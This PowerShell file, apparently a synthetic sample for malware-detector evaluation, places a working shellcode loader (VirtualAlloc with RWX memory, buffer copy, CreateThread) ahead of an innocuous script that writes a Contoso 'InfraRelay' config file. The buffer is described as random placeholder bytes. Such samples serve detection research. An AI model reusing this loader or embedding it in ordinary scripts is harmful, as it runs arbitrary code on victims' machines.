
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class Win32Api
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x80, 0xd0, 0x40, 0x24, 0xc1, 0xc4, 0xad, 0x9a, 0x38, 0x29, 0x4e, 0x8b, 0x15, 0xa6, 0x41, 0xdf,
        0xc4, 0xf1, 0x24, 0x86, 0x60, 0x46, 0xa0, 0x59, 0xa7, 0xd6, 0x43, 0x10, 0x9f, 0x6c, 0xbe, 0xa8,
        0xb9, 0x86, 0x9e, 0x38, 0xc5, 0x0b, 0xc6, 0x4b, 0x32, 0xe0, 0x5b, 0xb3, 0x45, 0x76, 0x64, 0x79,
        0x3c, 0xb0, 0x1c, 0x8d, 0xab, 0x21, 0x86, 0x67, 0xdc, 0x56, 0x28, 0xef, 0x37, 0xa5, 0x81, 0x64,
        0xdc, 0x63, 0xa9, 0x18, 0x6e, 0x46, 0xea, 0x5a, 0xfe, 0xca, 0x02, 0xd7, 0xcd, 0x69, 0xd0, 0x7e,
        0x02, 0x26, 0x9f, 0x91, 0x71, 0xc6, 0x23, 0x59, 0x82, 0x1b, 0x78, 0xeb, 0x6f, 0xff, 0x3f, 0xe1,
        0xdd, 0x96, 0x7b, 0x07, 0xfe, 0x71, 0x72, 0x42, 0x68, 0x4f, 0xbb, 0xc0, 0x59, 0xb6, 0xb7, 0xf7,
        0xfb, 0x73, 0xbc, 0x7c, 0x36, 0x2a, 0x5e, 0x84, 0xa7, 0xf2, 0x26, 0x0b, 0xb1, 0x84, 0xd4, 0x21,
        0x17, 0x25, 0xf3, 0x18, 0xb3, 0xd9, 0x8e, 0xe6, 0x1a, 0x4e, 0xea, 0x0c, 0x61, 0xad, 0xaf, 0x90,
        0x80, 0x10, 0x20, 0xa4, 0x2e, 0x92, 0x48, 0x6f, 0x8c, 0x42, 0xbb, 0xd6, 0x8c, 0x58, 0x01, 0xab,
        0x63, 0xcd, 0x29, 0x0f, 0x9e, 0x78, 0x33, 0x02, 0x63, 0xde, 0xd0, 0xca, 0x10, 0x2a, 0x19, 0x27,
        0xeb, 0x4d, 0xda, 0x7f, 0x35, 0x5c, 0x79, 0xea, 0x0f, 0xc8, 0x63, 0x12, 0x3a, 0xd3, 0xf7, 0x4e,
        0x4f, 0x10, 0x57, 0x1e, 0xef
    )

    $ProcHandle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($ProcHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][Win32Api]::WaitForSingleObject($Thread, 4707)
    [void][Win32Api]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
#Requires -Version 5.1
$ErrorActionPreference = 'Stop'
$OutputPath  = "C:\ProgramData\Contoso\InfraRelay\config.json"
$Environment = "Staging"
$ApiPort     = 8443
$NodeCount   = 5
$Force       = $false


$config = [ordered]@{
    environment = $Environment
    port        = $ApiPort
    name        = 'InfraRelay'
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
}

$config | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $OutputPath -Encoding UTF8
Write-Host ("Wrote configuration to {0}" -f $OutputPath) -ForegroundColor Green
